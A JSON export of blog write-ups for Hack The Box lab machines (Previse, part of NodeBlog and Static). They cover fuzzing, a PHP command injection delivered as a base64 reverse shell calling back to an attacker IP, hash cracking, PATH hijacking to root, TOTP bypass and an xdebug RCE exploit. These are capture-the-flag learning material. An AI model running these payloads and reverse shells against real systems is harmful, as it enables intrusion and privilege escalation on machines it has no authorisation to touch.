server.js vi server.js node server.js sudo su  As it is using sudo su, we can guess that this user can be root using sudo. We can try the same password we extracted from MongoDB, and done:\nadmin@nodeblog:~$ sudo su [sudo] password for admin: root@nodeblog:/home/admin# cd root@nodeblog:~# cat root.txt 5ebff8f607158b4d1b78427af94f5358  ","image":"/images/HTB/NodeBlog/NodeBlog.png","permalink":"https://7rocky.github.io/en/htb/nodeblog/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine contains a blog that is vulnerable to NoSQL injection, then to XML External Entity (XXE) injection and finally to insecure deserialization to get Remote Code Execution. Advanced web pentesting techniques and scripting skills are needed in order to compromise this machine. This write-up uses custom scripts in Bash, Python and Node.js to exploit all vulnerabilities","time":7,"title":"NodeBlog"},{"contents":"  OS: Linux   Difficulty: Easy   IP Address: 10.10.11.104   Release: 07 / 08 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.104 -p 22,80 Nmap scan report for 10.10.11.104 Host is up (0.047s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA) | 256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA) |_ 256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) | http-title: Previse Login |_Requested resource was login.php | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 58.91 seconds  This machine has ports 22 (SSH) and 80 (HTTP) open.\nEnumeration If we go to http://10.10.11.104, we are redirected to a login form:\nLet\u0026rsquo;s apply fuzzing to enumerate more routes. We can add .php extensions just in case:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104/FUZZ -e .php index.php [Status: 302, Size: 2801, Words: 737, Lines: 72] download.php [Status: 302, Size: 0, Words: 1, Lines: 1] login.php [Status: 200, Size: 2224, Words: 486, Lines: 54] files.php [Status: 302, Size: 4914, Words: 1531, Lines: 113] header.php [Status: 200, Size: 980, Words: 183, Lines: 21] nav.php [Status: 200, Size: 1248, Words: 462, Lines: 32] footer.php [Status: 200, Size: 217, Words: 10, Lines: 6] css [Status: 301, Size: 310, Words: 20, Lines: 10] status.php [Status: 302, Size: 2968, Words: 749, Lines: 75] js [Status: 301, Size: 309, Words: 20, Lines: 10] logout.php [Status: 302, Size: 0, Words: 1, Lines: 1] accounts.php [Status: 302, Size: 3994, Words: 1096, Lines: 94] config.php [Status: 200, Size: 0, Words: 1, Lines: 1] logs.php [Status: 302, Size: 0, Words: 1, Lines: 1]  Notice that there are a lot of 302 status (302 Found). This means that the server is redirecting to /login.php. We can tell ffuf to follow redirects with -r flag:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.104/FUZZ -e .php -r index.php [Status: 200, Size: 2224, Words: 486, Lines: 54] download.php [Status: 200, Size: 2224, Words: 486, Lines: 54] login.php [Status: 200, Size: 2224, Words: 486, Lines: 54] files.php [Status: 200, Size: 2224, Words: 486, Lines: 54] header.php [Status: 200, Size: 980, Words: 183, Lines: 21] nav.php [Status: 200, Size: 1248, Words: 462, Lines: 32] footer.php [Status: 200, Size: 217, Words: 10, Lines: 6] css [Status: 200, Size: 939, Words: 61, Lines: 17] status.php [Status: 200, Size: 2224, Words: 486, Lines: 54] js [Status: 200, Size: 1155, Words: 77, Lines: 18] logout.php [Status: 200, Size: 2224, Words: 486, Lines: 54] accounts.php [Status: 200, Size: 2224, Words: 486, Lines: 54] config.php [Status: 200, Size: 0, Words: 1, Lines: 1] logs.php [Status: 200, Size: 2224, Words: 486, Lines: 54]  It seems clear that the website is redirecting to /login.php. The key here is that the 302 responses contain a response body. This can be seen clearly from Burp Suite:\nIf we render the content of the response, we will see the page from Burp Suite, but the browser will perform a redirect because of the 302 status.\nRegistering a new account Using Burp Suite, it is possible to intercept requests but also responses. We can fix the responses to change the status to 200 OK, so that the browser does not follow redirects. We need to go to Proxy \u0026gt; Options \u0026gt; Match and Replace \u0026gt; Add and put the following configuration:\nThat way, we are able to view all the contents of the website and also register an account in /accounts.php:\nAfter registering, we can login and get rid of all the annoying redirects.\nAnalyzing PHP source code There is a ZIP file uploaded by user newguy:\nIt contains a backup of all the PHP source code for the web server:\n$ unzip siteBackup.zip $ tree . ├── accounts.php ├── config.php ├── download.php ├── file_logs.php ├── files.php ├── footer.php ├── header.php ├── index.php ├── login.php ├── logout.php ├── logs.php ├── nav.php ├── siteBackup.zip └── status.php 0 directories, 14 files  Foothold In config.php we can find MySQL credentials:\n\u0026lt;?php function connectDB() { $host = 'localhost'; $user = 'root'; $passwd = 'mySQL_p@ssw0rd!:)'; $db = 'previse'; $mycon = new mysqli($host, $user, $passwd, $db); return $mycon; }  And we see a weird hashing method for passwords in login.php:\n$users = $result-\u0026gt;fetch_assoc(); $passHash = $users['password']; if (crypt($password, '$1$🧂llol$') == $passHash) { $result-\u0026gt;free(); $_SESSION['user'] = $users['username']; $result = $db-\u0026gt;query($sql); if (!$result) { echo 'Oops! Something went wrong, try again later!'; } $db-\u0026gt;close(); header('Location: index.php'); } else { echo '\u0026lt;div class=\"uk-alert-danger\"\u0026gt;Invalid Username or Password\u0026lt;/div\u0026gt;'; }  Finding a command injection We can also find a file called logs.php, which executes a Python script using a system call, with a non-sanitized string:\n\u0026lt;?php session_start(); if (!isset($_SESSION['user'])) { header('Location: login.php'); exit; } if (!$_SERVER['REQUEST_METHOD'] == 'POST') { header('Location: login.php'); exit; } ///////////////////////////////////////////////////////////////////////////////////// //I tried really hard to parse the log delims in PHP, but python was SO MUCH EASIER// ///////////////////////////////////////////////////////////////////////////////////// $output = exec(\"/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\"); echo $output; $filepath = \"/var/www/out.log\"; $filename = \"out.log\"; if (file_exists($filepath)) { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename=\"'.basename($filepath).'\"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($filepath)); ob_clean(); // Discard data in the output buffer flush(); // Flush system headers readfile($filepath); die(); } else { http_response_code(404); die(); }  This line of code is vulnerable:\n$output = exec(\"/usr/bin/python /opt/scripts/log_process.py {$_POST['delim']}\");  Because we can put a semicolon and inject another command. For instance, we can connect to the server using a reverse shell with nc:\n$ echo -n 'bash -i \u0026gt;\u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx  To make the request from curl, we must add the cookie to keep our session:\n$ curl http://10.10.11.104/logs.php -d 'delim=comma; echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash' -H 'Cookie: PHPSESSID=952sbct7uf71fvi95m0p2gvmvi'  And we receive the shell in nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.104. Ncat: Connection from 10.10.11.104:55204. bash: cannot set terminal process group (1369): Inappropriate ioctl for device bash: no job control in this shell www-data@previse:/var/www/html$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@previse:/var/www/html$ ^Z [1] + 70279 suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + 70279 continued ncat -nlvp 4444 reset xterm www-data@previse:/var/www/html$ export TERM=xterm www-data@previse:/var/www/html$ export SHELL=bash www-data@previse:/var/www/html$ stty rows 50 columns 158  The process of registering and account, entering as a new user and making the request with the malicious payload is automated in a Go program called foothold.go (detailed explanation here).\nIt can be run as follows:\n$ go run foothold.go 10.10.17.44 4444 [+] Creating username: 'aBwbf8GZPk', with password: 'LqsgiuEoyV' [*] Registration successful [*] Login successful. Cookie: PHPSESSID=t19n77eh9qt1ui2unipsoa6j0b; path=/ [!] Sent reverse shell. Check your nc listener  Lateral movement to user m4lwhere Now it is time to own user m4lwhere:\nwww-data@previse:/var/www/html$ ls /home m4lwhere  We can use the MySQL credentials found in config.php to connect to a database:\nwww-data@previse:/var/www/html$ mysql -u root --password='mySQL_p@ssw0rd!:)' mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | previse | | sys | +--------------------+ 5 rows in set (0.01 sec) mysql\u0026gt; use previse; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +-------------------+ | Tables_in_previse | +-------------------+ | accounts | | files | +-------------------+ 2 rows in set (0.00 sec) mysql\u0026gt; select * from accounts; +-----+----------+----------------------------------+---------------------+ | id | username | password | created_at | +-----+----------+----------------------------------+---------------------+ | 1 | m4lwhere | $1$🧂llol$DQpmdvnb7EeuO6UaqRItf. | 2021-05-27 18:18:36 | | ... | ... | ... | ... | +-----+----------+----------------------------------+---------------------+ 3 rows in set (0.00 sec)  This hash is a bit weird because it contains an emoji in the salt part of the hash. Using john and hashcat will be difficult because of the format. Although it can be solved, it is better to create a PHP script and crack the hash using the same hashing method used in the server (see files accounts.php or login.php):\n\u0026lt;?php $passHash = '$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.'; if ($file = fopen('rockyou.txt', 'r')) { while (!feof($file)) { $password = fgets($file); if (crypt(trim($password), '$1$🧂llol$') == $passHash) { echo $password; break; } } fclose($file); }  And the password is found:\n$ php crack.php ilovecody112235!  Now we can login via SSH and get the user.txt flag:\n$ ssh m4lwhere@10.10.11.104 m4lwhere@10.10.11.104's password: m4lwhere@previse:~$ cat user.txt ab438774e2b02effcf6d49753e5c8cb8  Privilege escalation This user can run a Bash script as root using sudo:\nm4lwhere@previse:~$ sudo -l [sudo] password for m4lwhere: User m4lwhere may run the following commands on previse: (root) /opt/scripts/access_backup.sh m4lwhere@previse:~$ ls -l /opt/scripts/access_backup.sh -rwxr-xr-x 1 root root 486 Jun 6 12:49 /opt/scripts/access_backup.sh m4lwhere@previse:~$ cat /opt/scripts/access_backup.sh  #!/bin/bash # We always make sure to store logs, we take security SERIOUSLY here # I know I shouldnt run this as root but I cant figure it out programmatically on my account # This is configured to run with cron, added to sudo so I can run as needed - we'll fix it later when there's time gzip -c /var/log/apache2/access.log \u0026gt; /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_access.gz gzip -c /var/www/file_access.log \u0026gt; /var/backups/$(date --date=\"yesterday\" +%Y%b%d)_file_access.gz  Exploiting PATH hijacking We cannot modify the file. However, the gzip command is being used in relative mode (as well as date). This is vulnerable to a PATH hijacking because there is no secure_path in the output of sudo -l.\nFirst, we create our own gzip command in /tmp, as an executable Bash script that sets /bin/bash as a SUID file:\nm4lwhere@previse:/tmp$ echo -e '#!/bin/bash\\nchmod u+s /bin/bash' \u0026gt; gzip m4lwhere@previse:/tmp$ chmod +x gzip m4lwhere@previse:/tmp$ cat gzip #!/bin/bash chmod u+s /bin/bash  Then, we add /tmp at the beginning of the PATH environment variable, so that the malicious gzip is found before the common one:\nm4lwhere@previse:/tmp$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin m4lwhere@previse:/tmp$ export PATH=/tmp:$PATH m4lwhere@previse:/tmp$ echo $PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin m4lwhere@previse:/tmp$ which gzip /tmp/gzip  And finally, we can execute the Bash script with root permissions, so that /bin/bash is converted to an SUID binary:\nm4lwhere@previse:/tmp$ ls -l /bin/bash -rwxr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash m4lwhere@previse:/tmp$ sudo /opt/scripts/access_backup.sh m4lwhere@previse:/tmp$ ls -l /bin/bash -rwsr-xr-x 1 root root 1113504 Jun 6 2019 /bin/bash  Now we have rooted the machine, so we can read the root.txt flag:\nm4lwhere@previse:/tmp$ bash -p bash-4.4# cat /root/root.txt 3b2115c0ed9ca779182d6d777b1ed40a  ","image":"/images/HTB/Previse/Previse.png","permalink":"https://7rocky.github.io/en/htb/previse/","section":"htb","summary":"Hack The Box. Linux. Easy machine. This machine has a webpage vulnerable to command injection after bypassing redirects and managing to register a new account. After that, a hash must be cracked to login as a low privileged user and perform a PATH hijacking using sudo. Common web pentesting and Burp Suite skills, as well as common privilege escalation techniques are needed to compromise the machine. This write-up uses a custom Go program to automate the foothold process","time":9,"title":"Previse"},{"contents":"  OS: Linux   Difficulty: Hard   IP Address: 10.10.10.246   Release: 19 / 06 / 2021   Port scanning # Nmap 7.92 scan initiated as: nmap -sC -sV -Pn -o nmap/targeted 10.10.10.246 -p 22,2222,8080 Nmap scan report for 10.10.10.246 Host is up (0.044s latency).  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) | ssh-hostkey: | 2048 16:bb:a0:a1:20:b7:82:4d:d2:9f:35:52:f4:2e:6c:90 (RSA) | 256 ca:ad:63:8f:30:ee:66:b1:37:9d:c5:eb:4d:44:d9:2b (ECDSA) |_ 256 2d:43:bc:4e:b3:33:c9:82:4e:de:b6:5e:10:ca:a7:c5 (ED25519) 2222/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a9:a4:5c:e3:a9:05:54:b1:1c:ae:1b:b7:61:ac:76:d6 (RSA) | 256 c9:58:53:93:b3:90:9e:a0:08:aa:48:be:5e:c4:0a:94 (ECDSA) |_ 256 c7:07:2b:07:43:4f:ab:c8:da:57:7f:ea:b5:50:21:bd (ED25519) 8080/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). | http-robots.txt: 2 disallowed entries |_/vpn/ /.ftp_uploads/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 27.37 seconds This machine has ports 22, 2222 (SSH) and 8080 (HTTP) open.\nWeb enumeration If we go to http://10.10.10.246 using a web browser, we will see an empty page. Looking at the nmap output, we discover that there is a robots.txt file exposed:\n$ curl 10.10.10.246:8080/robots.txt User-agent: * Disallow: /vpn/ Disallow: /.ftp_uploads/ And thus we have two routes to test. The page http://10.10.10.246/vpn shows a simple login form like this one:\nSince it is a simple form, we can try some simple credentials. After several attempts, we find that admin:admin works. However, we have to enter a 2FA (Two Factor Authentication) code:\nLet\u0026rsquo;s leave this for the moment and explore http://10.10.10.246/.ftp_uploads. As it can be seen, directory listing is enabled:\nThe file called warning.txt says the following:\n$ curl http://10.10.10.246:8080/.ftp_uploads/warning.txt Binary files are being corrupted during transfer!!! Check if are recoverable. Let\u0026rsquo;s check if it is true. If we download the file db.sql.gz and extract the db.sql file from inside, we will get an error:\n$ 7z x db.sql.gz ... Scanning the drive for archives: 1 file, 262 bytes (1 KiB) Extracting archive: db.sql.gz -- Path = db.sql.gz Type = gzip Headers Size = 17 ERROR: CRC Failed : db.sql Sub items Errors: 1 Archives with Errors: 1 Sub items Errors: 1 However, 7z is able to extract the db.sql file. Nevertheless, it is malformed:\nCREATE DATABASE static; USE static; CREATE TABLE users ( id smallint unsignint a\u0026#39;n a)Co3 Nto_increment,sers name varchar(20) a\u0026#39;n a)Co, password varchar(40) a\u0026#39;n a)Co, totp varchar(16) a\u0026#39;n a)Co, primary key (idS iaA; INSERT INTOrs ( id smaers name vpassword vtotp vaS iayALUESsma, prim\u0026#39;admin\u0026#39;im\u0026#39;d05nade22ae348aeb5660fc2140aec35850c4da997m\u0026#39;d0orxxi4c7orxwwzlo\u0026#39; IN Therefore, the warning is true. We need to think about how the Gzip file was corrupted.\nPatching a Gzip file Since the directory is called .ftp_uploads, maybe the Gzip file was uplaoded using FTP but in ASCII mode and not in binary mode. We discover this issue doing some research on the Internet.\nWhat happens is that FTP in ASCII mode will change new line characters (\\n) to carriage return and new line (\\r\\n), modifying the file and corrupting it (if it were a text file, no visual changes would be done). The patch is easy: we only need to find \\r\\n inside the file and replace the matching occurrences with \\n.\nIf we show the content of the corrupted Gzip file in hexadecimal, we see that there are four occurences of \\r\\n (in hexadecimal ASCII, \\r corresponds to 0x0d and \\n to 0x0a):\n$ xxd db.sql.gz 00000000: 1f8b 0808 ae8b eb5e 0003 6462 2e73 716c .......^..db.sql 00000010: 0055 8ec1 6ec2 3010 44ef f98a bd25 9138 .U..n.0.D....%.8 00000020: 84c4 0920 4e86 fa80 84a8 4442 afd5 d676 ... N.....DB...v 00000030: 8bd5 d846 b6d3 40bf be69 a902 9c76 a479 ...F..@..i...v.y 00000040: 333b eb3d a30d 8327 dad0 15ad 19f8 8041 3;.=...\u0026#39;.......A 00000050: f165 74b8 d3eb 2b33 105b 069d 97ce 4302 .et...+3.[....C. 00000060: 4a80 d7d8 b6ca 04e8 8c57 1f46 0d0a 3036 J........W.F..06 00000070: 80e9 da16 b00b f655 19ee a496 264c fe52 .......U....\u0026amp;L.R 00000080: 06b5 842f 74fc 882e c9b3 74a4 2770 42ef .../t.....t.\u0026#39;pB. 00000090: 7beb c468 9307 3bd8 701a ad69 f590 744a {..h..;.p..i..tJ 000000a0: a3bb c0a7 bc40 a244 0d0a e912 a2cd ae66 .....@.D.......f 000000b0: fb06 36bb e6f9 6eef 6dc5 ede1 7f77 0d0a ..6...n.m....w.. 000000c0: 2f74 7b60 f5c0 5d6b 6314 5a99 7810 222b /t{`..]kc.Z.x.\u0026#34;+ 000000d0: 0d0a 99e7 280b 3247 f956 5655 f6ce f329 ....(.2G.VVU...) 000000e0: c950 f2a2 9c97 1927 0217 8bd9 2f6b ddf9 .P.....\u0026#39;..../k.. 000000f0: ac08 9f0d b7ef bf5b 1b0f 6ba2 e807 eaf0 .......[..k..... 00000100: 78b0 6301 0000 x.c... $ xxd db.sql.gz | grep -o 0d0a 0d0a 0d0a 0d0a 0d0a To patch the Gzip file, I decided to use a simple Ruby script that downloads the file, takes the contents, replaces every occurrence of \\r\\n by \\n and outputs it to a file. Then we can decompress the patched file without errors. This can be done in the same Ruby script with a few lines:\n#!/usr/bin/env ruby  require \u0026#39;uri\u0026#39; require \u0026#39;zlib\u0026#39;  require \u0026#39;net/http\u0026#39;  sql_file = \u0026#39;db.sql\u0026#39; gz_file = \u0026#34;#{sql_file}.gz\u0026#34; tmp = \u0026#34;tmp_#{gz_file}\u0026#34; host = \u0026#39;10.10.10.246:8080\u0026#39;  puts \u0026#34;[*] Downloading corrupted #{gz_file}file\u0026#34;  url = URI(\u0026#34;http://#{host}/.ftp_uploads/#{gz_file}\u0026#34;) res = Net::HTTP.get(url) File.binwrite(gz_file, res)  File.open(gz_file, \u0026#39;rb\u0026#39;) { |f| File.binwrite(tmp, f.read.gsub(\u0026#34;\\r\\n\u0026#34;, \u0026#34;\\n\u0026#34;)) }  Zlib::GzipReader.open(tmp) do |f|  sql = f.read.strip  puts \u0026#34;[+] Patched #{gz_file}file. Found #{sql_file}:\\n\\n#{sql}\u0026#34;   File.open(sql_file, \u0026#39;w\u0026#39;) { |ff| ff.write(sql) } end Now we execute the script and get the db.sql file as is:\n$ ruby patch_gz.rb [*] Downloading corrupted db.sql.gz file [+] Patched db.sql.gz file. Found db.sql: CREATE DATABASE static; USE static; CREATE TABLE users ( id smallint unsigned not null auto_increment, username varchar(20) not null, password varchar(40) not null, totp varchar(16) not null, primary key (id) ); INSERT INTO users ( id, username, password, totp ) VALUES ( null, \u0026#39;admin\u0026#39;, \u0026#39;d033e22ae348aeb5660fc2140aec35850c4da997\u0026#39;, \u0026#39;orxxi4c7orxwwzlo\u0026#39; ); This SQL file creates a table called users with fields id, username, password and totp. And then a new user is inserted with name admin. Though the password is a hash, if we crack it we will get admin (something that we already know). The other value is orxxi4c7orxwwzlo for totp.\nHandling 2FA This value for totp corresponds to the key used for the TOTP (Time-based One-Time Password) algorithm. The TOTP algorithm is implemented in Python and Ruby libraries (among others); there are also apps like Google Authenticator or online solutions.\nSince I decided to use Ruby this time, let\u0026rsquo;s do this TOTP stuff with Ruby. First, we must install rotp with gem install rotp. And then, from irb (interactive Ruby) we can get the code:\n$ irb irb(main):001:0\u0026gt; require \u0026#39;rotp\u0026#39; =\u0026gt; true irb(main):002:0\u0026gt; totp = ROTP::TOTP.new(\u0026#39;orxxi4c7orxwwzlo\u0026#39;) =\u0026gt; #\u0026lt;ROTP::TOTP:0x0000000147827380 @digest=\u0026#34;sha1\u0026#34;, @digits=6, @interval=30, @issuer=nil, @secret=\u0026#34;orxxi4c7orxwwzlo\u0026#34;\u0026gt; irb(main):003:0\u0026gt; totp.now =\u0026gt; \u0026#34;309130\u0026#34; irb(main):004:0\u0026gt; totp.now =\u0026gt; \u0026#34;860691\u0026#34; Unfortunately, these codes do not work. I tried other solutions, but the codes were the same, so the problem was not in Ruby.\nThen, I figured out that since it is a Time-based OTP, I needed to have the same date as the machine. One can get the server\u0026rsquo;s current date in the HTTP response headers if it is enabled. For example:\n$ curl 10.10.10.246:8080 -I HTTP/1.1 200 OK Date: Fri, 10 Dec 2021 22:22:22 GMT Server: Apache/2.4.38 (Debian) Content-Type: text/html; charset=UTF-8 Then, we can add this date to the Ruby command and get a valid TOTP:\nirb(main):006:0\u0026gt; require \u0026#39;time\u0026#39; =\u0026gt; true irb(main):007:0\u0026gt; date = Time.parse(\u0026#39;Fri, 10 Dec 2021 22:22:22 GMT\u0026#39;).to_i =\u0026gt; 1639174942 irb(main):008:0\u0026gt; totp.at(date) =\u0026gt; \u0026#34;626733\u0026#34; During the attemts, I tried to add the TOTP calculation and the login process (using admin:admin) in the Ruby script to check if it was a timing issue. As a result, I had the login process programmed, and when I found the issue, I did have a working script to login as admin with these lines of code:\nrequire \u0026#39;rotp\u0026#39; require \u0026#39;time\u0026#39; require \u0026#39;uri\u0026#39;  require \u0026#39;net/http\u0026#39;  host = \u0026#39;10.10.10.246:8080\u0026#39; totp = \u0026#39;orxxi4c7orxwwzlo\u0026#39;  url = URI(\u0026#34;http://#{host}/vpn/login.php\u0026#34;) res = Net::HTTP.post(url, \u0026#39;username=admin\u0026amp;password=admin\u0026amp;submit=Login\u0026#39;) cookie = res[\u0026#39;Set-Cookie\u0026#39;] server_time = Time.parse(res[\u0026#39;Date\u0026#39;]).to_i puts \u0026#39;[+] Login successful\u0026#39;  code = ROTP::TOTP.new(totp).at(server_time) puts \u0026#34;[*] Generating TOTP code: #{code}\u0026#34;  res = Net::HTTP.post(url, \u0026#34;code=#{code}\u0026#34;, { Cookie: cookie }) location = res[\u0026#39;Location\u0026#39;]  puts \u0026#34;[+] 2FA successful. Go to http://#{host}/vpn/#{location}\u0026#34; puts \u0026#34;[+] Cookie: #{cookie}\u0026#34; The script returns the URL where to go (since the server applies a redirection) and the cookie to keep authenticated:\n$ ruby login_2fa.rb [+] Login successful [*] Generating TOTP code: 508175 [+] 2FA successful. Go to http://10.10.10.246:8080/vpn/panel.php [+] Cookie: PHPSESSID=1l5prlovq3bek3488ehmi03koj; path=/ We can see a panel like this:\nHere we can download a VPN as an .ovpn file (like the one used to connect to Hack The Box machines). We also see that there are some machines that should be accessible using the VPN.\nJust to complete the Ruby script, I decided to put everything together. As a result, the script downloads and patches the Gzip file, extracts the TOTP key from the SQL contents, does the login and 2FA and finally downloads the VPN file as static.ovpn. This script is called get_vpn.rb (detailed explanation here).\nConnection to Static VPN If we simply run openvpn static.ovpn, we will see some errors. The problem is that the file contains a subdomain called vpn.static.htb:\n$ head static.ovpn client dev tun9 proto udp remote vpn.static.htb 1194 resolv-retry infinite nobind user nobody group nogroup persist-key persist-tun Thus, we need to add the subdomain to /etc/hosts. After that, the VPN connection works properly and we are assigned IP address 172.30.0.9.\nHowever, we do have no connection to the online IP address listed in the previous portal. We can fix this adding routes manually:\n# route add -net 172.20.0.0 172.30.0.1 255.255.255.0 add net 172.20.0.0: gateway 172.30.0.1 $ ping -c 1 172.20.0.10 PING 172.20.0.10 (172.20.0.10): 56 data bytes 64 bytes from 172.20.0.10: icmp_seq=0 ttl=63 time=50.941 ms --- 172.20.0.10 ping statistics --- 1 packets transmitted, 1 packets received, 0.0% packet loss round-trip min/avg/max/stddev = 50.941/50.941/50.941/0.000 ms $ ping -c 1 172.20.0.11 PING 172.20.0.11 (172.20.0.11): 56 data bytes 64 bytes from 172.20.0.11: icmp_seq=0 ttl=63 time=51.849 ms --- 172.20.0.11 ping statistics --- 1 packets transmitted, 1 packets received, 0.0% packet loss round-trip min/avg/max/stddev = 51.849/51.849/51.849/0.000 ms Exploiting an internal server After a simple nmap scan for 172.20.0.10, we see that it is a web server:\n# nmap -sS -p- -Pn -n 172.20.0.10 Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 172.20.0.10 Host is up (0.059s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 57.40 seconds This server shows the following directory listing:\nThe directory vpn is the same as before, so it is not interesting.\nThe file info.php shows a common phpinfo() with all the PHP configuration. After reading all the information, we discover that xdebug is enabled:\nThis is a problem because we can connect to the server for \u0026ldquo;debugging\u0026rdquo; reasons and gain Remote Code Execution (RCE). Looking for exploits, we can find this one made in Python version 2. This exploit works and returns an interactive command shell.\nI decided to translate it to Python version 3 and fix it in order to obtain a common reverse shell with nc. The resulting exploit can be found here: xdebug_shell.py (detailed explanation here).\nWe can use the exploit to gain access tho the internal web server (remember to use the Static VPN IP address and not the Hack The Box one):\n$ python3 xdebug_shell.py http://172.20.0.10/info.php 172.30.0.9 4444 $ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 172.30.0.1. Ncat: Connection from 172.30.0.1:55308. bash: cannot set terminal process group (37): Inappropriate ioctl for device bash: no job control in this shell www-data@web:/var/www/html$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null www-data@web:/var/www/html$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm www-data@web:/var/www/html$ export TERM=xterm www-data@web:/var/www/html$ export SHELL=bash www-data@web:/var/www/html$ stty rows 50 columns 158 Here we can find user.txt flag:\nwww-data@web:/var/www/html$ ls -la total 16 drwxr-xr-x 3 root root 4096 Apr 6 2020 . drwxr-xr-x 3 root root 4096 Jun 14 2021 .. -rw-r--r-- 1 root root 19 Apr 3 2020 info.php drwxr-xr-x 3 root root 4096 Jun 17 2020 vpn www-data@web:/var/www/html$ ls /home user.txt www-data www-data@web:/var/www/html$ cat /home/user.txt c3f343befcac5fa92fb5373456e94247 Moreover, we have an id_rsa for user www-data:\nwww-data@web:/var/www/html$ ls -la /home/www-data total 16 drwxr-x--- 4 www-data www-data 4096 Jun 14 2021 . drwxr-xr-x 3 root root 4096 Jun 14 2021 .. lrwxrwxrwx 1 root root 9 Jun 14 2021 .bash_history -\u0026gt; /dev/null drwx------ 2 www-data www-data 4096 Jun 14 2021 .cache drwx------ 2 www-data www-data 4096 Jun 14 2021 .ssh www-data@web:/var/www/html$ ls -la /home/www-data/.ssh total 20 drwx------ 2 www-data www-data 4096 Jun 14 2021 . drwxr-x--- 4 www-data www-data 4096 Jun 14 2021 .. -rw-r--r-- 1 www-data www-data 390 Jun 14 2021 authorized_keys -rw------- 1 www-data www-data 1675 Jun 14 2021 id_rsa -rw-r--r-- 1 www-data www-data 390 Jun 14 2021 id_rsa.pub Then, we can copy or transfer the id_rsa file and connect via SSH. We can access through IP address 172.20.0.10:\n$ ssh -i id_rsa www-data@172.20.0.10 www-data@web:~$ But also through IP address 10.10.10.246 and port 2222 (recall that there were two SSH services running):\n$ ssh -i id_rsa www-data@10.10.10.246 -p 2222 www-data@web:~$ Network enumeration Let\u0026rsquo;s see what network interfaces we have:\nwww-data@web:~$ ifconfig eth0: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500  inet 172.20.0.10 netmask 255.255.255.0 broadcast 172.20.0.255  ether 02:42:ac:14:00:0a txqueuelen 0 (Ethernet)  RX packets 286733 bytes 62939217 (62.9 MB)  RX errors 0 dropped 0 overruns 0 frame 0  TX packets 284115 bytes 109282923 (109.2 MB)  TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 eth1: flags=4163\u0026lt;UP,BROADCAST,RUNNING,MULTICAST\u0026gt; mtu 1500  inet 192.168.254.2 netmask 255.255.255.0 broadcast 192.168.254.255  ether 02:42:c0:a8:fe:02 txqueuelen 0 (Ethernet)  RX packets 16555 bytes 3910920 (3.9 MB)  RX errors 0 dropped 0 overruns 0 frame 0  TX packets 23781 bytes 10145337 (10.1 MB)  TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 lo: flags=73\u0026lt;UP,LOOPBACK,RUNNING\u0026gt; mtu 65536  inet 127.0.0.1 netmask 255.0.0.0  loop txqueuelen 1000 (Local Loopback)  RX packets 576 bytes 38947 (38.9 KB)  RX errors 0 dropped 0 overruns 0 frame 0  TX packets 576 